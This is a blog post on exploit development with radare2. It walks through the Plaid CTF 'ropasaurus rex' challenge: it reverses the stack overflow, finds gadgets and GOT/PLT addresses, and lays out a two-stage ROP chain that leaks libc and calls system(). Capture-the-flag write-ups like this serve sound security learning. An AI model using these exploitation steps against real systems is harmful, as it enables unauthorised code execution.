
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>crowell&#8217;s blog</title>
  <meta name="author" content="Jeffrey Crowell">

  
  <meta name="description" content="radare2 is a very cool set of tools that you probably don&rsquo;t know how to use!
Let&rsquo;s go through a simple exploit CTF challenge to &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://crowell.github.io">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="crowell's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">crowell&#8217;s blog</a></h1>
  
    <h2>ctf, hacking, and reversing</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:crowell.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/11/23/pwning-with-radare2/">Pwning With Radare2</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-11-23T22:42:33-05:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>10:42 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>radare2 is a very cool set of tools that you probably don&rsquo;t know how to use!
Let&rsquo;s go through a simple exploit CTF challenge to understand how to use it for
exploit development.</p>

<p>We&rsquo;ll be focusing on &ldquo;ropasaurus rex&rdquo; which is a simple challenge from Plaid CTF
After checking out the latest and greatest radare from git, let&rsquo;s get started!</p>

<p>Open up ropasaurusrex in r2 and call analyze on the binary.
We can list the functions with &ldquo;afl&rdquo;</p>

<p><img src="http://i.imgur.com/18NyivR.png" alt="Imgur" /></p>

<p>First thing to do, let&rsquo;s see how the binary looks. To disassemble, r2 uses the
<code>pd</code> directive. So let&rsquo;s disassemble the main function with <code>pdf @ main</code></p>

<p><img src="http://i.imgur.com/PAFblNt.png" alt="Imgur" /></p>

<p>Ok so main is a very simple function. We can &ldquo;decompile&rdquo; it by hand.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int main() {
</span><span class='line'>  fcn.0x80483f4();
</span><span class='line'>  sym.imp.write(stdout, str.WIN_n, 4);  // write is fd, string, len
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>We can print the string to see what is being printed.</p>

<p><img src="http://i.imgur.com/Sp4IZjw.png" alt="Imgur" /></p>

<p>Ok, so time to see what happens in 0x80483f4</p>

<p><img src="http://i.imgur.com/yZW400k.png" alt="Imgur" /></p>

<p>Great, this function is also very simple.
Let&rsquo;s reverse it!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sub_0x80483f4() {
</span><span class='line'>  char buffer[0x88];
</span><span class='line'>  sym.imp.read(stdin, buffer, 0x100);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>So we see that 0x100 (256) bytes are read in.
&ldquo;buffer&rdquo; is on the stack size 0x88. This is size 136. We read in 256 bytes on
the stack buffer which is only size 136. Great, we found the vulnerability, but
don&rsquo;t stop now, Let&rsquo;s get a shell, radare2 has some more tools that can help us
with that.</p>

<p>Let&rsquo;s check what protections are on the binary. We know our machine runs with
ASLR (and if your&rsquo;s doesn&rsquo;t why not!?!?)</p>

<p>I like to use the tool &ldquo;checksec.sh&rdquo; from trapkit.de</p>

<p><img src="http://i.imgur.com/Hu0YuI9.png" alt="Imgur" /></p>

<p>Looks like nx is enabled. So, we&rsquo;re going to need to rop!
First thing to do, is find out how big our buffer is so that we can take control
of EIP.</p>

<p>ragg2 + radare2 can be used with De Bruijn patterns to find the offset.
We use ragg2 to generate the pattern, and r2 to find how far into the pattern
before the return address on the stack is overwritten.</p>

<p><img src="http://i.imgur.com/mPxdxJJ.png" alt="Imgur" /></p>

<p>Ok, great, so the exploit can be [140 bytes of padding|start of rop chain]</p>

<p>Because we have both read and write libc functions, we can create a rop chain
that will do the following.</p>

<ul>
<li>Leak libc address of write

<ul>
<li>Compute offset of <code>system</code> with the provided libc (I&rsquo;m using mine here on
ubuntu)</li>
</ul>
</li>
<li>Write our command to somewhere.</li>
<li>Return to vulnerable function, now we know the location of <code>system</code></li>
<li>Call <code>system</code> with our written string.</li>
</ul>


<p>So first, we should find the locations of <code>read</code> and <code>write</code> in the PLT</p>

<p><img src="http://i.imgur.com/wIS8uFD.png" alt="Imgur" /></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[0xf77db0d0]&gt; afl |grep read
</span><span class='line'>0x0804832c  6  1  sym.imp.read
</span><span class='line'>[0xf77db0d0]&gt; afl |grep write
</span><span class='line'>0x0804830c  6  1  sym.imp.write</span></code></pre></td></tr></table></div></figure>


<p>ok, so we can call either of those there.</p>

<p>As for the GOT, we can find it like so</p>

<p><img src="http://i.imgur.com/9B7LamN.png" alt="Imgur" /></p>

<p>To leak a libc address we&rsquo;ll want to read from the GOT entry of a known libc
function. We can see that read is in the GOT at 0x804961c.
Write is done as such.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssize_t write(int fildes, const void *buf, size_t nbyte);</span></code></pre></td></tr></table></div></figure>


<p>So something like this is what we want.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>write(1 /*stdout*/, 0x804961c /*read@got*/, 4 /*size to read*/);</span></code></pre></td></tr></table></div></figure>


<p>But then, how do we clean up the stack to go to our next function which is to
write our command? We need to pop 3 items off of the stack, and set the return
address to read. So first, let&rsquo;s find how to pop off the stack.
r2 has some great rop gadget search tools, so we need to find gadgets that do
the following.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pop ?
</span><span class='line'>pop ?
</span><span class='line'>pop ?
</span><span class='line'>ret</span></code></pre></td></tr></table></div></figure>


<p>Where <code>?</code> can be any register, we don&rsquo;t really care. This cleans up the stack
and gets us to the next return address. We can use the <code>/R</code> command for finding
gadgets.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[0x08048440]&gt; /R  pop,pop,pop,ret</span></code></pre></td></tr></table></div></figure>


<p>r2 gives us back a bunch of example gadgets. I see one here which looks nice.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  0x080484b6           5e  pop esi
</span><span class='line'>  0x080484b7           5f  pop edi
</span><span class='line'>  0x080484b8           5d  pop ebp
</span><span class='line'>  0x080484b9           c3  ret</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ll refer to this as &ldquo;pppr&rdquo; for poppoppopret.
So, stage 1 of our payload can look like this</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>STAGE 1
</span><span class='line'>--frame_1--
</span><span class='line'>[write@plt]
</span><span class='line'>[pppr     ] // return address
</span><span class='line'>[1        ]
</span><span class='line'>[read@got ]
</span><span class='line'>[4        ]
</span><span class='line'>--frame_2--
</span><span class='line'>[??       ]</span></code></pre></td></tr></table></div></figure>


<p>Next, we need to find a place to write our command string to system.
We can use the read function to do that. Read looks like this</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssize_t read(int fd, void *buf, size_t count);```</span></code></pre></td></tr></table></div></figure>


<p>So let&rsquo;s do</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>read(0 /*stdin*/, target, length of command);</span></code></pre></td></tr></table></div></figure>


<p>We now need a place to read the string to. ELF has different sections, with
different permissions. Some are read only, write only, execute only, or any
combination of the three! rabin2 lets us see the secitions and find the
permissions and sizes of each, so we can tell where to write to.
<img src="http://i.imgur.com/YsU1Blx.png" alt="Imgur" />
Perfect! there are plenty of sections. Generally I like to write to the <code>.bss</code>
section, but this is only size 8, which would limit our command. So let&rsquo;s pick
the <code>.dynamic</code> section. It is size 208, and we can write to it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>idx=20 vaddr=0x08049530 paddr=0x00000530 sz=208 vsz=208 perm=-rw- name=.dynamic</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ll reuse the same pppr gadget, because write has the same number of args.
So now our rop chain can be.
I&rsquo;ll call 0x08049530 writeaddr, and len(cmd) the length of our command.
So this now leaks the libc address of read. Then calls read from stdin to a
memory address that we can write to. Then we need to return to our vulnerable
function to then execute the system address that we calculate.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>STAGE 1
</span><span class='line'>--frame_1--
</span><span class='line'>[write@plt]
</span><span class='line'>[pppr     ] // return address
</span><span class='line'>[1        ]
</span><span class='line'>[read@got ]
</span><span class='line'>[4        ]
</span><span class='line'>--frame_2--
</span><span class='line'>[read@plt ]
</span><span class='line'>[pppr     ]
</span><span class='line'>[0        ]
</span><span class='line'>[writeaddr]
</span><span class='line'>[len(cmd) ]
</span><span class='line'>--frame_3--
</span><span class='line'>[vuln_func]</span></code></pre></td></tr></table></div></figure>


<p>In my libc, we can find the offsets of read and system. Because we leak the
libc address of read, we can compute where system is by doing the following
math.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>offset = libc_read - libc_system
</span><span class='line'>sys_addr = leaked_read_addr - offset</span></code></pre></td></tr></table></div></figure>


<p>I get the following addresses, using gdb instead of r2, because I dont know
how to do this quickly in r2 ;)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>minishwoods old/ropasaurusrex Â» gdb -q /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ p system
</span><span class='line'>$1 = {&lt;text variable, no debug info&gt;} 0x40100 &lt;system&gt;
</span><span class='line'>gdb-peda$ p read
</span><span class='line'>$2 = {&lt;text variable, no debug info&gt;} 0xdb4b0 &lt;read&gt;</span></code></pre></td></tr></table></div></figure>


<p>Now all that is left is to do the same stack smash, then call system.
System looks like this</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int system(const char *command);</span></code></pre></td></tr></table></div></figure>


<p>So we just want</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>system(0x08049530 /*address of the string we wrote*/);</span></code></pre></td></tr></table></div></figure>


<p>Then were done! Stage 2 of the rop can be like this</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>STAGE 2
</span><span class='line'>--frame_1--
</span><span class='line'>[system   ]
</span><span class='line'>[JUNK     ] //can be any 4 bytes, we dont care once we execute system()
</span><span class='line'>[writeaddr]</span></code></pre></td></tr></table></div></figure>


<p>Put it all together in a neat exploit like this
<a href="https://gist.github.com/48bcb49cb71f96b98367">https://gist.github.com/48bcb49cb71f96b98367</a>
and were all done!</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/11/23/pwning-with-radare2/">Pwning With Radare2</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Jeffrey Crowell -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
